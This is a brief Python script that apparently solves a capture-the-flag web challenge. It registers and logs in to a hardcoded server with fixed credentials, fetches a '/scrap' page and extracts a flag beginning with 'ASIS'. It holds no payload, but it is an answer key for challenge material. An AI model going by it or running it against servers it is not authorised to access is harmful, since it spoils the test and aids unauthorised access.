import requests, re

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(host: str, port: str) -> str:
    with requests.Session() as session:
        data = {
            "username": "sk1240256",
            "password": "sk1240256"
        }
        session.post(f"{host}:{port}/register", data = data)
        session.post(f"{host}:{port}/login", data = data)
        flag = get_flag(session.get(f"{host}:{port}/scrap").text, "ASIS")
    return flag

if __name__ == "__main__":
    host = "http://91.107.176.228"
    port = "3000"
    print(solution(host, port))
    